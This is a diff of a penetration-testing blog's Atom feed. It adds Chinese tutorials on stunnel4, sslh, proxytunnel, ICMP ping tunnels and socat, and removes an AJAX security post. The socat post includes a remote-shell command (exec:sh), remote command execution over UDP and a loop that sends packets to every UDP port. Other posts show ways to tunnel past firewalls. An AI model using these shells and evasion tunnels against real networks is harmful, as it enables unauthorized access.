@@ -45,6 +45,176 @@
   </entry>
   
   <entry>
+    <title>stunnel4基于SSL加密的隧道工具</title>
+    <link href="http://c.cat.plus/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
+    <id>http://c.cat.plus/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</id>
+    <published>2015-07-11T11:51:03.000Z</published>
+    <updated>2020-06-05T07:20:59.006Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h3 id="stunnel4"><a href="#stunnel4" class="headerlink" title="stunnel4"></a><strong>stunnel4</strong></h3></blockquote><ul><li>无需修改源代码的情况下将TCP流量封装于SSL通道内</li><li>适用于本身不支持加密传输的应用</li><li>支持openssl安全特性</li><li>跨平台</li><li>性能优,多并发</li></ul><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a><strong>环境部署</strong></h4><h5 id="安装内网stunnel4服务器"><a href="#安装内网stunnel4服务器" class="headerlink" title="安装内网stunnel4服务器"></a><strong>安装内网stunnel4服务器</strong></h5><ul><li><p>服务器端配置</p></li><li><p>Linux生成根证书:</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new –days 365 -nodes -x509 -out &#x2F;etc&#x2F;stunnel&#x2F; stunnel.pem -keyout &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</span><br></pre></td></tr></table></figure><ul><li>创建配置文件:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;stunnel&#x2F;stunnel.conf</span><br><span class="line">cert &#x3D; &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</span><br><span class="line">setuid &#x3D; stunnel4</span><br><span class="line">setgid &#x3D; stunnel4</span><br><span class="line">pid &#x3D; &#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;stunnel4.pid</span><br><span class="line">[mysqls]</span><br><span class="line">accept  &#x3D; 0.0.0.0:443</span><br><span class="line">connect &#x3D; 1.1.1.11:3306</span><br></pre></td></tr></table></figure><p><strong>stunnel4自动启动</strong></p><pre><code>/etc/default/stunnel4    ENABLED=1</code></pre><p><strong>启动stunnel4服务</strong></p><pre><code>service stunnel4 start</code></pre><p><strong>防火墙规则</strong></p><ul><li>端口映射TCP/443端口到stunnel4服务端TCP/443</li><li>设置防火墙规则</li></ul><h5 id="Stunnel4客户端"><a href="#Stunnel4客户端" class="headerlink" title="Stunnel4客户端"></a><strong>Stunnel4客户端</strong></h5><p><strong>安装stunnel4客户端</strong></p><ul><li>kaLi自带</li></ul><p><strong>客户端配置</strong></p><pre><code>创建配置文件    vi /etc/stunnel/stunnel.conf    client = yes    [mysqls]    accept = 3306    connect = 192.168.1.11:443</code></pre><p><strong>客户端自动启动</strong></p><pre><code>/etc/default/stunnel4    ENABLED=1</code></pre><p><strong>启动客户端服务</strong></p><pre><code>service stunnel4 stop /start</code></pre><p><strong>Mysql客户端连接服务器</strong></p><pre><code>mysql -u root -h 127.0.0.1</code></pre><ul><li>抓包对比隧道前后差异</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h3 id=&quot;stunnel4&quot;&gt;&lt;a href=&quot;#stunnel4&quot; class=&quot;headerlink&quot; title=&quot;stunnel4&quot;&gt;&lt;/a&gt;&lt;strong&gt;stunnel4&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
+&lt;ul&gt;
+
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
+    
+    
+      <category term="stunnel4" scheme="http://c.cat.plus/tags/stunnel4/"/>
+    
+      <category term="kaLi" scheme="http://c.cat.plus/tags/kaLi/"/>
+    
+      <category term="openssl" scheme="http://c.cat.plus/tags/openssl/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sslh端口转发分配器</title>
+    <link href="http://c.cat.plus/2015/07/11/Traffic_manipulation/sslh%E7%AB%AF%E5%8F%A3%E5%88%86%E9%85%8D%E5%99%A8/"/>
+    <id>http://c.cat.plus/2015/07/11/Traffic_manipulation/sslh%E7%AB%AF%E5%8F%A3%E5%88%86%E9%85%8D%E5%99%A8/</id>
+    <published>2015-07-10T21:51:03.000Z</published>
+    <updated>2020-06-05T07:08:46.246Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h3 id="sslh"><a href="#sslh" class="headerlink" title="sslh"></a><strong>sslh</strong></h3></blockquote><h4 id="端口分配器"><a href="#端口分配器" class="headerlink" title="端口分配器"></a><strong>端口分配器</strong></h4><ul><li>根据客户端第一个包检测协议类型</li><li>根据协议检测结果将流量转发给不同目标</li><li>支持HTTP,HTTPS,SSH,OpenVPN,tinc,XMPP和其它可基于正则表达式判断的人和协议类型</li><li>适用于防火墙允许443端口 <strong>入站</strong> 访问流量的环境</li></ul><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a><strong>配置文件</strong></h5><pre><code>vi /etc/default/sslh    RUN=yes    DAEMON_OPTS=&quot;--user sslh --listen 1.1.1.10:443 --ssh 127.0.0.1:22 --ssl 1.1.1.11:443 --http 127.0.0.1:80 --pidfile /var/run/sslh/sslh.pid&quot;</code></pre><h5 id="安装HTTPS站点"><a href="#安装HTTPS站点" class="headerlink" title="安装HTTPS站点"></a><strong>安装HTTPS站点</strong></h5><ul><li>安装IIS服务,证书服务</li><li>部署HTTPS站点</li></ul><h5 id="启动本地HTTP服务"><a href="#启动本地HTTP服务" class="headerlink" title="启动本地HTTP服务"></a><strong>启动本地HTTP服务</strong></h5><h5 id="防火墙端口映射TCP-443"><a href="#防火墙端口映射TCP-443" class="headerlink" title="防火墙端口映射TCP/443"></a><strong>防火墙端口映射TCP/443</strong></h5><h5 id="nmap扫描服务识别"><a href="#nmap扫描服务识别" class="headerlink" title="nmap扫描服务识别"></a><strong>nmap扫描服务识别</strong></h5><pre><code>nmap -p443 -sV -A 192.168.1.11</code></pre><p><em>扫描结果验证:443端口识别为多个服务</em></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h3 id=&quot;sslh&quot;&gt;&lt;a href=&quot;#sslh&quot; class=&quot;headerlink&quot; title=&quot;sslh&quot;&gt;&lt;/a&gt;&lt;strong&gt;sslh&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
+&lt;h4 id=&quot;端口分配器&quot;&gt;&lt;a hre
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
+    
+    
+      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+    
+      <category term="sslh" scheme="http://c.cat.plus/tags/sslh/"/>
+    
+      <category term="nmap" scheme="http://c.cat.plus/tags/nmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HTTP代理隧道工具-proxytunnel</title>
+    <link href="http://c.cat.plus/2015/07/09/Traffic_manipulation/HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-proxytunnel/"/>
+    <id>http://c.cat.plus/2015/07/09/Traffic_manipulation/HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-proxytunnel/</id>
+    <published>2015-07-09T10:31:02.000Z</published>
+    <updated>2020-06-05T07:17:28.578Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h3 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a><strong>proxytunnel</strong></h3></blockquote><ul><li>通过标准的HTTP/HTTPS代理创建隧道的工具</li><li>通过HTTP Connect 方法封装信息</li><li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li><li>无法创建DNS隧道和ICMP隧道</li></ul><h4 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a><strong>Lab1</strong></h4><h5 id="将外网资源映射为内网指定端口"><a href="#将外网资源映射为内网指定端口" class="headerlink" title="将外网资源映射为内网指定端口"></a><strong>将外网资源映射为内网指定端口</strong></h5><ul><li>内网安装squid3代理,proxytunnel<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;squid3&#x2F;squid.conf</span><br><span class="line">&#x2F;^http_port</span><br><span class="line">&#x2F;^http_access#改allow</span><br><span class="line">&#x2F;^acl</span><br></pre></td></tr></table></figure></li></ul><p>创建隧道:</p><pre><code>proxytunnel -a 80 -p 127.0.0.1:3128 -d 192.168.1.1:80</code></pre><h4 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a><strong>Lab2</strong></h4><h5 id="外网资源非防火墙允许端口"><a href="#外网资源非防火墙允许端口" class="headerlink" title="外网资源非防火墙允许端口"></a><strong>外网资源非防火墙允许端口</strong></h5><ul><li>修改目标资源侦听端口可能无法躲避防火墙深层检测</li><li>外网安装squid3代理服务器并侦听80端口</li><li>创建隧道:<pre><code>proxytunnle -a 80 -p 127.0.0.1:3128 -r 192.168.1.1:80 -d 192.168.1.1:22</code></pre></li></ul><h4 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a><strong>Lab3</strong></h4><h5 id="ssh客户端配置自动创建代理链隧道"><a href="#ssh客户端配置自动创建代理链隧道" class="headerlink" title="ssh客户端配置自动创建代理链隧道"></a><strong>ssh客户端配置自动创建代理链隧道</strong></h5><pre><code>vi ~/.ssh/configHost 192.168.1.1    Hostname 192.168.1.1    ProtocolKeepAlives 30    ProxyCommand /usr/bin/proxytunnel -p 1.1.1.1:3128 -r 192.168.1.1:80 -d %h:%p</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h3 id=&quot;proxytunnel&quot;&gt;&lt;a href=&quot;#proxytunnel&quot; class=&quot;headerlink&quot; title=&quot;proxytunnel&quot;&gt;&lt;/a&gt;&lt;strong&gt;proxytunnel&lt;/strong&gt;&lt;/h3&gt;&lt;/block
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
+    
+    
+      <category term="proxytunnel" scheme="http://c.cat.plus/tags/proxytunnel/"/>
+    
+      <category term="HTTP隧道" scheme="http://c.cat.plus/tags/HTTP%E9%9A%A7%E9%81%93/"/>
+    
+      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ptunnel基于ICMP协议的隧道工具</title>
+    <link href="http://c.cat.plus/2015/07/09/Traffic_manipulation/ptunnel%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
+    <id>http://c.cat.plus/2015/07/09/Traffic_manipulation/ptunnel%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</id>
+    <published>2015-07-08T16:51:01.000Z</published>
+    <updated>2020-06-02T15:00:05.533Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a><strong>ptunnel</strong></h3><p>Ping tunnel ICMP隧道工具</p></blockquote><ul><li>通过ICMP echo(ping requests)和reply(ping reply)实现隧道</li><li>适用于防火墙只允许ping出站流量的环境</li><li>支持多并发连接,性能优</li><li>支持身份验证</li><li>需要root权限</li><li>支持抓包<br>  Win:winpacap<br>  Linux:libpcap</li><li>工作过程<br>  Proxy,Client,Destination</li></ul><p><strong>Server</strong></p><pre><code>ptunnel -x 1234</code></pre><p><strong>Client</strong></p><pre><code>sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234</code></pre><h4 id="嵌套SSH隧道"><a href="#嵌套SSH隧道" class="headerlink" title="嵌套SSH隧道"></a><strong>嵌套SSH隧道</strong></h4><pre><code>ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></pre><ul><li>ptunnel 直到目前的最新版本仍存在拒绝服务漏洞-0.72</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h3 id=&quot;ptunnel&quot;&gt;&lt;a href=&quot;#ptunnel&quot; class=&quot;headerlink&quot; title=&quot;ptunnel&quot;&gt;&lt;/a&gt;&lt;strong&gt;ptunnel&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;Ping tunnel ICMP隧道工具
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
+    
+    
+      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
+    
+      <category term="ptunnel" scheme="http://c.cat.plus/tags/ptunnel/"/>
+    
+      <category term="ICMP" scheme="http://c.cat.plus/tags/ICMP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>socat数据流通道工具做端口转发</title>
+    <link href="http://c.cat.plus/2015/07/07/Traffic_manipulation/socat%E6%95%B0%E6%8D%AE%E6%B5%81%E9%80%9A%E9%81%93%E5%B7%A5%E5%85%B7%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+    <id>http://c.cat.plus/2015/07/07/Traffic_manipulation/socat%E6%95%B0%E6%8D%AE%E6%B5%81%E9%80%9A%E9%81%93%E5%B7%A5%E5%85%B7%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
+    <published>2015-07-07T10:21:21.000Z</published>
+    <updated>2020-06-02T15:01:45.885Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h3 id="SOCAT"><a href="#SOCAT" class="headerlink" title="SOCAT"></a><strong>SOCAT</strong></h3></blockquote><ul><li>被称为nc++ (增强增强版的nc)<br>  双向数据流通道工具</li></ul><p><strong>连接端口</strong></p><pre><code>socat - tcp:1.1.1.1:80</code></pre><p><strong>侦听端口</strong></p><pre><code>socat - tcp4-listen:22        /    socat - tcp-l:333</code></pre><p><strong>接收文件</strong></p><pre><code>socat tcp4-listen:333 open:2.txt,creat,append</code></pre><p><strong>发送文件</strong></p><pre><code>cat 1.txt | socat - tcp4:1.1.1.1:333</code></pre><h4 id="远程shell-–服务器端"><a href="#远程shell-–服务器端" class="headerlink" title="远程shell –服务器端"></a><strong>远程shell</strong> –服务器端</h4><pre><code>Server: socat tcp-l:23 exec:sh,pty,stderrClient: socat - tcp:1.1.1.1:23</code></pre><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a><strong>端口转发</strong></h4><pre><code>socat tcp4-listen:8080,fork tcp4:192.168.254.254:80</code></pre><h4 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a><strong>远程执行命令</strong></h4><pre><code>Server: socat - udp-l:2001Client: echo &quot;`id`&quot; | socat - udp4-datagram:1.1.1.1:2001</code></pre><h4 id="UDP-全端口任意内容发包"><a href="#UDP-全端口任意内容发包" class="headerlink" title="UDP 全端口任意内容发包"></a><strong>UDP 全端口任意内容发包</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PORT in &#123;1..65535&#125;; do echo &quot;aaaaa&quot; | socat - UDP4-DATAGRAM: 1.1.1.1:$PORT; sleep .1; done</span><br></pre></td></tr></table></figure><h4 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a><strong>二进制编辑器</strong></h4><pre><code>echo -e &quot;\0\14\0\0\c&quot; | socat -u - file:/usr/bin/ squid.exe,seek,seek=0x00074420</code></pre><h4 id="简单的web服务器"><a href="#简单的web服务器" class="headerlink" title="简单的web服务器"></a><strong>简单的web服务器</strong></h4><pre><code>socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\ \&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\ \\&quot;\&quot;&quot;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h3 id=&quot;SOCAT&quot;&gt;&lt;a href=&quot;#SOCAT&quot; class=&quot;headerlink&quot; title=&quot;SOCAT&quot;&gt;&lt;/a&gt;&lt;strong&gt;SOCAT&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;被称为nc++ 
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
+    
+    
+      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
+    
+      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+    
+      <category term="socat" scheme="http://c.cat.plus/tags/socat/"/>
+    
+  </entry>
+  
+  <entry>
     <title>DNS协议隧道iodine及ncat</title>
     <link href="http://c.cat.plus/2015/07/06/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93iodine%E5%8F%8Ancat/"/>
     <id>http://c.cat.plus/2015/07/06/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93iodine%E5%8F%8Ancat/</id>
@@ -69,19 +239,19 @@
       <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
     
     
-      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
-    
-      <category term="ncat" scheme="http://c.cat.plus/tags/ncat/"/>
-    
-      <category term="iodine" scheme="http://c.cat.plus/tags/iodine/"/>
+      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
     
       <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
     
       <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
     
-      <category term="ssh" scheme="http://c.cat.plus/tags/ssh/"/>
+      <category term="ncat" scheme="http://c.cat.plus/tags/ncat/"/>
     
-      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
+      <category term="iodine" scheme="http://c.cat.plus/tags/iodine/"/>
+    
+      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
+    
+      <category term="ssh" scheme="http://c.cat.plus/tags/ssh/"/>
     
   </entry>
   
@@ -111,15 +281,15 @@
       <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
     
     
-      <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
-    
-      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
-    
-      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
+      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
     
       <category term="dns2tcp" scheme="http://c.cat.plus/tags/dns2tcp/"/>
     
-      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
+      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
+    
+      <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
+    
+      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
     
       <category term="Bodhi" scheme="http://c.cat.plus/tags/Bodhi/"/>
     
@@ -196,9 +366,9 @@
     
       <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
     
-      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
-    
       <category term="shell" scheme="http://c.cat.plus/tags/shell/"/>
+    
+      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
     
   </entry>
   
@@ -231,13 +401,13 @@
     
       <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
     
+      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
+    
       <category term="重定向" scheme="http://c.cat.plus/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
     
       <category term="Rinetd" scheme="http://c.cat.plus/tags/Rinetd/"/>
     
       <category term="monowall" scheme="http://c.cat.plus/tags/monowall/"/>
-    
-      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
     
   </entry>
   
@@ -312,11 +482,11 @@
     
       <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
     
+      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
+    
       <category term="Ettercap" scheme="http://c.cat.plus/tags/Ettercap/"/>
     
       <category term="PTH" scheme="http://c.cat.plus/tags/PTH/"/>
-    
-      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
     
       <category term="中间人攻击" scheme="http://c.cat.plus/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
     
@@ -351,11 +521,11 @@
     
       <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
     
-      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
-    
       <category term="driftnet" scheme="http://c.cat.plus/tags/driftnet/"/>
     
       <category term="dsniff" scheme="http://c.cat.plus/tags/dsniff/"/>
+    
+      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
     
   </entry>
   
@@ -589,176 +759,6 @@
       <category term="Wordlist" scheme="http://c.cat.plus/tags/Wordlist/"/>
     
       <category term="crunch" scheme="http://c.cat.plus/tags/crunch/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>AJAX技术组合及WebService安全考虑</title>
-    <link href="http://c.cat.plus/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/"/>
-    <id>http://c.cat.plus/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/</id>
-    <published>2014-05-20T20:02:37.000Z</published>
-    <updated>2020-05-21T08:00:21.818Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="AJAX-Asynchronous-Javascript-and-XML-异步JS和XML"><a href="#AJAX-Asynchronous-Javascript-and-XML-异步JS和XML" class="headerlink" title="AJAX (Asynchronous Javascript and XML)        //异步JS和XML"></a><strong>AJAX</strong> (Asynchronous Javascript and XML)        //异步JS和XML</h4><p>是一个概念,而非一种新的编程语言,是一组现有技术的组合<br>通过客户端脚本动态更新页面部分内容,而非整个页面<br>降低带宽使用,提高速度<br>提升用户体验<br>后台异步访问</p><p><strong>AJAX组件</strong><br>JavaScript: ajax的核心组件,使用XMLHTTPRequest 对象接口向服务器发起请求,接收并处理服务器响应数据<br><strong>Dynamic HTML</strong>(DHTML)<br>早于AJAX出现,通过Javascript,CSS等在客户端修改HTML页面element,缺点是完全依赖客户端代码修改页面,与服务器<br>的交互由JavaScript applets完成,AJAX的XHR弥补了他的缺点(注册用户)<br><strong>Document Object Model(DOM)</strong><br>处理html,xml文档对象的框架,DHTML是一个浏览器,DOM作为其一个实现的接口,定义和管理每个页面元素obj的Properties,method,event.</p><p><strong>基于AJAX的WEB应用工作流程</strong><br>XMLHTTPRequest API创建对象xmlhttp进行访问<br>XML,json,html,文本,图片<br>多个异步请求独立通信,互不依赖<br>AJAX框架<br>    JQuery<br>    Dojo Toolkit<br>    Google web toolkit(GWT)<br>    Microsoft AJAX library</p><p>目前没有通用的AJAX安全最佳实践,其攻击面不为大多数人所知<br>AJAX的安全问题<br>多种技术混合,增加了攻击面,每个参数都可能形成独立的攻击过程<br>AJAX引擎是个全功能的脚本解释器,访问恶意站点可能后果严重,虽然浏览器有砂箱和SOP,但可被绕过<br>服务器,客户端代码结合使用产生混乱,服务器访问控制不当,将信息泄露<br>暴露应用程序逻辑</p><h4 id="AJAX对渗透测试的挑战"><a href="#AJAX对渗透测试的挑战" class="headerlink" title="AJAX对渗透测试的挑战"></a><strong>AJAX对渗透测试的挑战</strong></h4><ul><li>异步请求数量多且隐蔽</li><li>触发AJAX请求的条件无规律</li><li>手动和截断代理爬网可能产生大量遗漏<br>AJAX爬网工具<br>  ZAP<br>客户端代码审计<br>  源码<br>  firebug</li></ul><h4 id="WEB-Service"><a href="#WEB-Service" class="headerlink" title="WEB Service"></a><strong>WEB Service</strong></h4><p>面向服务的架构(Service Oriented Architecture)便于不同系统集成共享数据和功能<br>尤其适合不想暴漏数据模型和程序逻辑而访问数据的场景<br>无页面</p><p><strong>两种类型WEB Service</strong><br>Simple Object Access Protosol(SOAP)        //简单对象访问协议<br>    传统的Web service开发方法,xml是唯一的数据交换格式<br>    要求安全性的应用更多采用<br>RESTful(Representational State Transfer architecture) REST        //代表性状态传输架构<br>    目前更多被采用的轻量web service,JSON是首选数据交换格式</p><h4 id="WEB-Service安全考虑"><a href="#WEB-Service安全考虑" class="headerlink" title="WEB Service安全考虑"></a><strong>WEB Service安全考虑</strong></h4><p>使用API key或session token实现和跟踪身份认证<br>身份认证由服务器完成,而非客户端<br>API key,用户名,Session token永远不要通过URL发送<br>RESTful默认不提供任何安全机制,需要使用SSL/TLS保护传输数据安全<br>SOAP提供强于HTTPS的WS-security机制<br>使用OAuth或HMAC进行身份验证,HMAC身份认证使用C/S共享的密钥加密API key<br>RESTful应只允许身份认证用户使用PUT,DELETE方法<br>使用随机token防止CSRF攻击</p><p>对用户提交参数过滤,建议部署基于严格白名单的方法<br>报错信息消毒<br>直接对象引用应严格身份验证</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4 id=&quot;AJAX-Asynchronous-Javascript-and-XML-异步JS和XML&quot;&gt;&lt;a href=&quot;#AJAX-Asynchronous-Javascript-and-XML-异步JS和XML&quot; class=&quot;headerlink&quot; title=&quot;AJ
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="AJAX" scheme="http://c.cat.plus/tags/AJAX/"/>
-    
-      <category term="ZAP" scheme="http://c.cat.plus/tags/ZAP/"/>
-    
-      <category term="DOM" scheme="http://c.cat.plus/tags/DOM/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SSL_TSL中间人攻击</title>
-    <link href="http://c.cat.plus/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-    <id>http://c.cat.plus/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
-    <published>2014-05-19T10:02:37.000Z</published>
-    <updated>2020-05-21T08:24:02.602Z</updated>
-    
